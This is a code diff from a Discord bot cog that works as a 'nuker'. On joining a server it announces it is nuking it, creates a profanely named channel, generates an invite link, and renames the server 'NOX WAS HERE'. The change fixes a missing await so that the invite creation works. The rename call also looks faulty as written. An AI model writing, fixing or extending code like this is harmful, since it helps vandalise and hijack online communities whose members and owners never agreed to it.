@@ -17,7 +17,7 @@ class Startup(commands.Cog):
             try:
                 print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
                 await guild.create_text_channel(f'fuckme1')
-                invite = self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
+                invite = await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                 print(f'Guild: {guild.name} - {str(guild.id)} - Invite: {str(invite)} :)')
                 await guild.edit("NOX WAS HERE" + str(random.randint(1, 100)))
                 print(f'Nuked guild: {guild.name} - {str(guild.id)} - Changed server name :)')
